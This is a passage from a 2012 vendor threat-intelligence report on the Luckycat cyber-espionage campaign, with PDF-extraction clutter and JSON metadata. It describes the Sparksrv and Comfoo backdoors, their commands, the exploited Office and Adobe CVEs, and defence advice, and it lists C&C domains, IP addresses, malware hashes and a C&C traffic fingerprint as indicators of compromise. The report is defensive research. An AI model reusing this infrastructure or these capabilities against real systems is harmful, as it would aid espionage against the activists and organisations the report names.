mail.tibet.net users.\n\n_Figure 18: Phishing page hosted on duojee.info_\n\nThe duojee.info server also has other malware from\ntwo additional families available for download. One _Figure 19: Relationship between the Sparksrv and the Luckycat_\nmalware is known as “Comfoo,” related to yet another _campaigns_\ncyber-espionage campaign, while the other is known as\n“Sparksrv.” The Sparksrv malware, detected by Trend Micro as BKDR_\n\nRPKNUF.A, was initially found on a ShadowNet server in\nNovember 2011. We have, however, found several instances\n\n##### Sparksrv\n\nof a newer version of the same malware on duojee.\n_info. The malware initially sends the following plain-text_\n\nSparksrv refers to a second-stage malware that provides information through port 443:\nbackdoor access with significantly more functionality     - IP address\nthan first-stage droppers. Second-stage malware, often     - Identifier\nRemote Administration Trojans (RATs), are deployed\nbecause first-stage malware only provide simple “check-in”     - MAC address\nfunctionality such as a short list of commands that can be\nscheduled. Second-stage RATs, on the other hand, provide\nan additional access channel as well as “real-time” control\nover a compromised machine if the attackers and the\nvictims are online at the same time.\n\n\n-----\n\n|MD5|Domain|IP Address|\n|---|---|---|\n|0a927897ab5acff1e6bd45897368253b|fidk.rkntils.dnset.com|69.162.71.254|\n|b53f71e4dd2ca8826e6191dee439564b|fidk.rkntils.dnset.com|69.162.71.254|\n|a2b37776e0bd6594c688a8214371b9ff|rukiyeangel.dyndns.pro|199.192.152.100|\n\n|MD5|IP Address|\n|---|---|\n|d0eec59f1e74c0851c8dd1c8be88f2b9|173.208.242.25|\n\n\nOnce the malware establishes a connection, it then starts to receive commands from the C&C server, which allow the\nattackers to do the following:\n\n       - Start or kill a process       - Create or delete\n\ndirectories\n\n       - Copy or search for a file\n\n                            - Load a DLL\n\n       - Download or upload\n\nfiles        - Invoke a command shell\n\nMD5 Domain IP Address\n\n0a927897ab5acff1e6bd45897368253b _fidk.rkntils.dnset.com_ _69.162.71.254_\n\nb53f71e4dd2ca8826e6191dee439564b _fidk.rkntils.dnset.com_ _69.162.71.254_\n\na2b37776e0bd6594c688a8214371b9ff _rukiyeangel.dyndns.pro_ _199.192.152.100_\n\n_Table 6: Sparksrv malware samples and C&C locations_\n\nWe also found an older version of the malware on a\nShadowNet server, sunshine.shop.co.\n\nMD5 IP Address\n\nd0eec59f1e74c0851c8dd1c8be88f2b9 _173.208.242.25_\n\n_Table 7: Older Sparksrv malware version found on a ShadowNet_\n\n_server_\n\n##### Comfoo\n\nComfoo malware have been seen in conjunction with\ncampaigns targeting sensitive entities in both Japan and\nIndia. We found a version of the Comfoo malware on the\n_duojee.info server as well as an email attack that used the_\nsame version of Comfoo malware. In fact, the .DOC file\nused in the attack dropped an .EXE file with the same MD5\nhash as the one found on the duojee.info server.\n\n_Figure 20: Relationship between the Comfoo and the Luckycat_\n\n_campaigns_\n\n\n-----\n\n|Command|Description|\n|---|---|\n|0x233C|Invoke command shell|\n|0x1B6C|Take screenshot|\n|0x139C|Start interactive desktop|\n|0x1F54|Start keylogging|\n|0xFDC|Stop service|\n|0xFF0|Delete service|\n|0xBCC|Enumerate running processes|\n|0xBE0|Terminate process|\n|0x2EF4|Download file|\n\n\nWhile at least two of the Comfoo variants are essentially\nthe same, the traffic encryption methods used in the\nComfoo sample found in connection with duojee.info\ndiffered from other Comfoo variants we’ve analyzed that\nare not directly related to the Luckycat campaign. The\nmore common Comfoo malware samples we analyzed used\ncustom encryption methods while the variant found on\nthe duojee.info server utilized the Windows Cryptographic\n_Application Programming Interface (API). This Comfoo_\nvariant’s initial network communication sent the following\ninformation to the C&C server:\n\n       - Randomly generated characters\n\n       - MAC address _Figure 21: Sample Comfoo campaign email_\n\n       - IP address This Comfoo email attack leverages the current situation\n\nin Tibet to encourage recipients to open a malicious\n\n       - OS version attachment that exploits a vulnerability in Microsoft\n\n_Office—CVE-2010-3333, in order to drop a malware onto the_\n\n       - String, “liberate,” as campaign code target’s system.\n\nThe attackers gather the following information from\ninfected systems:\n\n       - CPU, NETBIOS, and disk information\n\n       - System, OS version, and account information\n\n       - Network adapters, protocols, and configuration\n\ninformation\n\n       - Installed applications as well as Internet Explorer (IE)\n\nand Browser Helper Object (BHO) information\n\nThe malware the attackers use is capable of receiving\nseveral commands.\n\nCommand Description\n\n_Figure 22: Comfoo decoy document that exploits a Microsoft_\n\n0x233C Invoke command shell Office vulnerability\n\n0x1B6C Take screenshot\n\nAfter the decoy document opens, the Comfoo malware\n\n0x139C Start interactive desktop\n\nbegins to communicate with johnnees.rkntils.10dig.net,\n\n0x1F54 Start keylogging which resolves to the IP address, 69.162.71.254—the same\n\n0xFDC Stop service host that some Sparksrv malware samples we analyzed\n\n0xFF0 Delete service use.\n\n0xBCC Enumerate running processes\n\n0xBE0 Terminate process\n\n0x2EF4 Download file\n\n_Table 8: Commands the Comfoo malware receive_\n\n\n-----\n\n|MD5|CVE Identifier|Campaign Code|\n|---|---|---|\n|24552d599b650ca3ecd467d9d740de33|CVE-2010-3333|liberate|\n|6815ab1f11ac33d4c1149efc3206d794|Not applicable|liberate|\n|6bd4e7d7408e0d8d1592e27fc19650c8|Not applicable|liberate|\n\n\nMD5 CVE Identifier Campaign Code\n\n24552d599b650ca3ecd467d9d740de33 _CVE-2010-3333_ liberate\n\n6815ab1f11ac33d4c1149efc3206d794 Not applicable liberate\n\n6bd4e7d7408e0d8d1592e27fc19650c8 Not applicable liberate\n\n_Table 9: Comfoo malware samples_\n\nThe samples in Table 9 connect to havefuns.rkntils.10dig.net or johnnees.rkntils.10dig.net, which both resolve to the same\nIP address—69.162.71.254.\n\n\n-----\n\n#### CONCLUSION DEFENDING AGAINST APTS\n\nTargeted attacks have been extremely successful, Sufficiently motivated threat actors can penetrate\nmaking the scope of the problem truly global. These even networks that use moderately advanced security\nhave been affecting governments, militaries, defense measures. As such, apart from standard and relevant\nindustries, high-technology companies, intergovernmental attack prevention measures and mechanisms such as\norganizations, nongovernmental organizations (NGOs), solid patch management; endpoint and network security;\nmedia organizations, academic institutions, and activists firewall use; and the like, enterprises should also focus\nworldwide. on detecting and mitigating attacks. Moreover, data loss\n\nprevention (DLP) strategies such as identifying exactly\n\nTargeted attacks are not isolated smash-and-grab what an organization is protecting and taking into account\nincidents. They are part of consistent campaigns that the context of data use should be employed.\naim to establish persistent, covert presence in a target’s\nnetwork so that information can be extracted as needed.\n\n##### Local and External Threat Intelligence\n\nTargeted attacks may not be easy to understand but\ncareful monitoring allows researchers to leverage the Threat intelligence refers to indicators that can be used\nmistakes attackers make to get a glimpse inside their to identify the tools, tactics, and procedures threat actors\noperations. Moreover, we can track cyber-espionage engaging in targeted attacks utilize. Both external and\ncampaigns over time using a combination of technical and local threat intelligence is crucial for developing the\ncontextual indicators. ability to detect attacks early. The following are the core\n\ncomponents of this defense strategy:\n\nThis paper specifically discussed the Luckycat campaign.\nIn the course of our research, we discovered that it had a     - Enhanced visibility: Logs from endpoint, server,\nmuch more diverse target set than previously thought. Not and network monitoring are an important and often\nonly did the attackers target military research institutions underused resource that can be aggregated to provide\nin India, as earlier disclosed by Symantec, they also a view of the activities within an organization that\ntargeted sensitive entities in Japan and India as well as can be processed for anomalous behaviors that can\nTibetan activists. They used a diversity of infrastructure indicate a targeted attack.\nas well, ranging from throw-away free-hosting sites to\ndedicated VPSs.    - Integrity checks: In order to maintain persistence,\n\nmalware will make modifications to the file system and\n\nWe also found that the Luckycat campaign can be linked registry. Monitoring such changes can indicate the\nto other campaigns as well. The people behind it used or presence of malware.\nprovided infrastructure for other campaigns that have also\nbeen linked to past targeted attacks such as the previously     - Empowering the human analyst: Humans are best\ndocumented ShadowNet campaign.[19] positioned to identify anomalous behaviors when\n\npresented with a view of aggregated logs from across\n\nUnderstanding the attack tools, techniques, and a network. This information is used in conjunction with\ninfrastructure used in the Luckycat campaign as well as custom alerts based on the local and external threat\nhow an individual incident is related to a broader campaign intelligence available.\nprovides the context necessary for us to assess its impact\nand come up with defensive strategies in order to protect\nour customers.\n\n\n-----\n\nTechnologies available today such as Deep Discovery\n\n##### Educating Employees Against Social\n\nprovide visibility, insight, and control over networks to\n\n##### Engineering\n\ndefend against targeted threats.[20] _Deep Discovery uniquely_\ndetects and identifies evasive threats in real time and\nprovides in-depth analysis and actionable intelligence to Security-related policies and procedures combined with\nprevent, discover, and reduce risks. education and training programs are essential components\n\nof defense. Traditional training methods can be fortified\n\n##### Mitigation and Cleanup Strategy by simulations and exercises using real spear-phishing\n\nattempts sent to test employees. Employees trained to\nexpect targeted attacks are better positioned to report\n\nOnce an attack is identified, the cleanup strategy should\n\npotential threats and constitute an important source of\n\nfocus on the following objectives:\n\nthreat intelligence.\n\n       - Determine the attack vector and cut off\n\n##### Data-Centric Protection Strategy\n\ncommunications with the C&C server.\n\n       - Determine the scope of the compromise. The ultimate objective of targeted attacks is to acquire\n\nsensitive data. As such, DLP strategies that focus on\n\n       - Assess the damage by analyzing the data and forensic identifying and protecting confidential information are\n\nartifacts available on compromised machines. critical. Enhanced data protection and visibility across\n\nan enterprise provides the ability to control access to\n\nRemediation should be applied soon afterward, which sensitive data as well as monitor and log successful and\nincludes steps to fortify affected servers, machines, or unsuccessful attempts to access it. Enhanced access\ndevices into secure states, informed in part by how the control and logging capabilities allow security analysts to\ncompromised machines were infiltrated. locate and investigate anomalies, respond to incidents, and\n\ninitiate remediation strategies and damage assessment.\n\n\n-----\n\n|Attack Component|Protection Technology|Trend Micro Solution|\n|---|---|---|\n|HTTP C&C communication fingerprint count.php?m=c&n=[HOSTNAME]_[MAC_ ADDRESS]_[CAMPAIGN_CODE]@|Web Reputation|Endpoint (Titanium, Worry-Free Business Security, OfficeScan) Server (Deep Security) Messaging (InterScan Messaging Security, ScanMail Suite for Microsoft Exchange) Network (Deep Discovery) Gateway (InterScan Web Security, InterScan Messaging Security) Mobile (Mobile Security)|\n|TROJ_WIMMIE VBS_WIMMIE|File Reputation (Antivirus/Anti-malware)|Endpoint (Titanium, Worry-Free Business Security, OfficeScan) Server (Deep Security) Messaging (InterScan Messaging Security, ScanMail Suite for Microsoft Exchange) Network (Deep Discovery) Gateway (InterScan Web Security, InterScan Messaging Security) Mobile (Mobile Security)|\n\n\n#### TREND MICRO THREAT\n PROTECTION AGAINST LUCKYCAT\n CAMPAIGN COMPONENTS\n\nThe following table summarizes the Trend Micro solutions for the components of the Luckycat campaign. Trend Micro\nrecommends a comprehensive security risk management strategy that goes further than advanced protection to meet\nthe real-time threat management requirements of dealing with targeted attacks.\n\nAttack Component Protection Technology Trend Micro Solution\n\nHTTP C&C communication fingerprint Web Reputation Endpoint (Titanium, Worry-Free Business\n_count.php?m=c&n=[HOSTNAME]_[MAC__ _Security, OfficeScan)_\n_ADDRESS]_[CAMPAIGN_CODE]@_ Server (Deep Security)\n\nMessaging (InterScan Messaging Security,\n_ScanMail Suite for Microsoft Exchange)_\nNetwork (Deep Discovery)\nGateway (InterScan Web Security,\n_InterScan Messaging Security)_\nMobile (Mobile Security)\n\nTROJ_WIMMIE File Reputation Endpoint (Titanium, Worry-Free Business\nVBS_WIMMIE (Antivirus/Anti-malware) _Security, OfficeScan)_\n\nServer (Deep Security)\nMessaging (InterScan Messaging Security,\n_ScanMail Suite for Microsoft Exchange)_\nNetwork (Deep Discovery)\nGateway (InterScan Web Security,\n_InterScan Messaging Security)_\nMobile (Mobile Security)\n\n\n-----\n\n|Attack Component|Protection Technology|Trend Micro Solution|\n|---|---|---|\n|CVE-2010-3333 CVE-2010-2883 CVE-2010-3654 CVE-2011-0611 CVE-2011-2462|Vulnerability Shielding/Virtual Patching|Server (Deep Security) Endpoint (OfficeScan with Intrusion Defense Firewall Plug-In) For CVE-2010-3333: Rule #1004498 (Microsoft Word .RTF File Parsing Stack Buffer Overflow Vulnerability) For CVE-2010-2883: Rule #1004393 (Adobe Reader SING Table Parsing Vulnerability) Rule #1004113 (identified malicious .PDF file) Rule #1004315 (identified malicious .PDF file - 3) For CVE-2010-3654: Rule #1004497 (Adobe Flash Player Unspecified Code Execution Vulnerability) For CVE-2011-0611: Rule #1004801 (Adobe Flash Player .SWF File Remote Memory Corruption Vulnerability) Rule #1004114 (identified malicious .SWF file) Rule #1004647 (restrict Microsoft Office file with embedded .SWF file) For CVE-2011-2462: Rule #1004871 (Adobe Acrobat/ Reader U3D Component Memory Corruption Vulnerability) Rule #1004873 (Adobe Acrobat/ Reader U3D Component Memory Corruption)|\n\n\nAttack Component Protection Technology Trend Micro Solution\n\n_CVE-2010-3333_ Vulnerability Shielding/Virtual Patching Server (Deep Security)\n_CVE-2010-2883_ Endpoint (OfficeScan with Intrusion\n_CVE-2010-3654_ _Defense Firewall Plug-In)_\n_CVE-2011-0611_ For CVE-2010-3333:\n_CVE-2011-2462_ Rule #1004498 (Microsoft Word\n\n_.RTF File Parsing Stack Buffer_\nOverflow Vulnerability)\nFor CVE-2010-2883:\n\nRule #1004393 (Adobe Reader SING\nTable Parsing Vulnerability)\nRule #1004113 (identified malicious\n.PDF file)\nRule #1004315 (identified malicious\n.PDF file - 3)\nFor CVE-2010-3654:\n\nRule #1004497 (Adobe Flash\n_Player Unspecified Code Execution_\nVulnerability)\nFor CVE-2011-0611:\n\nRule #1004801 (Adobe Flash\n_Player .SWF File Remote Memory_\nCorruption Vulnerability)\nRule #1004114 (identified malicious\n.SWF file)\nRule #1004647 (restrict Microsoft\n_Office file with embedded .SWF file)_\nFor CVE-2011-2462:\n\nRule #1004871 (Adobe Acrobat/\n_Reader U3D Component Memory_\nCorruption Vulnerability)\nRule #1004873 (Adobe Acrobat/\n_Reader U3D Component Memory_\nCorruption)\n\n\n-----\n\n|Attack Component|Protection Technology|Trend Micro Solution|\n|---|---|---|\n|cattree.1x.biz charlesbrain.shop.co footballworldcup.website.org frankwhales.shop.co hi21222325.x.gg kinkeechow.shop.co kittyshop.kilu.org perfect.shop.co pumasports.website.org tomsburs.shop.co vpoasport.shopping2000.com goodwell.all.co.uk fireequipment.website.org tennissport.website.org waterpool.website.org tb123.xoomsite.com tbda123.gwchost.com toms.0fees.net tomygreen.0fees.net killmannets.0fees.net maritimemaster.kilu.org masterchoice.shop.co jeepvihecle.shop.co lucysmith.0fees.net|Web, Domain, and IP Reputation|Endpoint (Titanium, Worry-Free Business Security, OfficeScan) Server (Deep Security) Messaging (InterScan Messaging Security, ScanMail Suite for Microsoft Exchange) Network (Deep Discovery) Gateway (InterScan Web Security, InterScan Messaging Security) Mobile (Mobile Security)|\n\n\nAttack Component Protection Technology Trend Micro Solution\n\n_cattree.1x.biz_ Web, Domain, and IP Reputation Endpoint (Titanium, Worry-Free Business\n_charlesbrain.shop.co_ _Security, OfficeScan)_\n_footballworldcup.website.org_ Server (Deep Security)\n_frankwhales.shop.co_ Messaging (InterScan Messaging Security,\n_hi21222325.x.gg_ _ScanMail Suite for Microsoft Exchange)_\n_kinkeechow.shop.co_ Network (Deep Discovery)\n_kittyshop.kilu.org_ Gateway (InterScan Web Security,\n_perfect.shop.co_ _InterScan Messaging Security)_\n_pumasports.website.org_ Mobile (Mobile Security)\n_tomsburs.shop.co_\n_vpoasport.shopping2000.com_\n_goodwell.all.co.uk_\n_fireequipment.website.org_\n_tennissport.website.org_\n_waterpool.website.org_\n_tb123.xoomsite.com_\n_tbda123.gwchost.com_\n_toms.0fees.net_\n_tomygreen.0fees.net_\n_killmannets.0fees.net_\n_maritimemaster.kilu.org_\n_masterchoice.shop.co_\n_jeepvihecle.shop.co_\n_lucysmith.0fees.net_\n\nTREND MICRO™ TREND MICRO INC.\n\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security 10101 N. De Anza Blvd.\nleader, creates a world safe for exchanging digital information with its In­ Cupertino, CA 95014\nternet content security and threat management solutions for businesses\nand consumers. A pioneer in server security with over U.S. toll free: 1 +800.228.5651\n20 years’ experience, we deliver top-ranked client, server and cloud- Phone: 1 +408.257.1500\nbased security that fits our customers’ and partners’ needs, stops Fax: 1 +408.257.2003\nnew threats faster, and protects data in physical, virtualized and cloud www.trendmicro.com\nenvironments. Powered by the industry-leading Trend Micro™ Smart Pro­\ntection Network™ cloud computing security infrastructure, our products\nand services stop threats where they emerge—from the Internet. They are\nsupported by 1,000+ threat intelligence experts around the globe.\n\n©2012 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated. All other product or company\n\n\n-----\n\ntargeted nature of related components and techniques. Also, while cybercrime focuses on stealing credit card and banking\ninformation to gain profit, APTs are better thought of as cyber espionage.\n\n## LUCKYCAT\n\n### First Seen\n\nIndividual targeted attacks are not one-off attempts. Attackers continually try to get inside the target’s network.\n\nThe Luckycat campaign has been active since at least June 2011.\n\n### Victims and Targets\n\nAPT campaigns target specific industries or communities of interest in specific regions.\n\nThe Luckycat campaign has been linked to 90 attacks against the following industries and/or communities in Japan and India:\n\n\nAEROSPACE   ENERGY   ENGINEERING   SHIPPING  MILITARY RESEARCH  TIBETAN ACTIVISTS\n\nThe threat actors behind the Luckycat campaign used a unique campaign code to track victims of specific attacks.\n\n### Operations\n\n\nThe 1st-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\n\n\n»» Targeted emails that are contextually relevant (i.e., emails containing a decoy document of radiation dose measurement results\nsent some time after the Great East Japan Earthquake)\n\n»» Exploited CVE-2010-3333 (aka, Rich Text Format [RTF] Stack Buffer Overflow Vulnerability) in several instances, although Adobe\n_Reader and Flash Player vulnerabilities were also exploited_\n\n»» Used TROJ_WIMMIE or VBS_WIMMIE—malware that take advantage of the Windows Management Instrumentation (WMI), making\nthe backdoor component undetectable through file scanning\n\n»» The WIMMIE malware, once inside the network, connects to a command-and-control (C&C) server via HTTP over port 80\n\n»» Attackers heavily used free web-hosting services to host their C&C servers under a diverse set of domain names but also used\nvirtual private servers (VPSs) for more stable operations\n### Possible Indicators of Compromise\n\n\nAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.\n\n\nWIMMIE malware do not leave much network fingerprint. However, the following is an identifiable HTTP C&C communication\nfingerprint—count.php?m=c&n=[HOSTNAME]_[MAC_ADDRESS]_[CAMPAIGN_CODE]@. This format can also be seen in the URL\ninside the script when /namespace:\\\\root\\subscription path __eventconsumer is typed in the command line for WMI.\n\n### Relationship with Other APT Campaigns\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/vun0x0rrek5l51djb8igbojb7v85sg3q",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2012/2012.03.26.Luckycat_Redux/wp_luckycat_redux.pdf"
    ],
    "report_names": [
        "wp_luckycat_redux"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041123,
    "ts_creation_date": 1332945038,
    "ts_modification_date": 1333025884,
    "files": {
        "pdf": "https://archive.orkl.eu/bdb218fdc0cce0bc57f77a9a1e6d3cc7e81b55f9.pdf",
        "text": "https://archive.orkl.eu/bdb218fdc0cce0bc57f77a9a1e6d3cc7e81b55f9.txt",
        "img": "https://archive.orkl.eu/bdb218fdc0cce0bc57f77a9a1e6d3cc7e81b55f9.jpg"
    }
}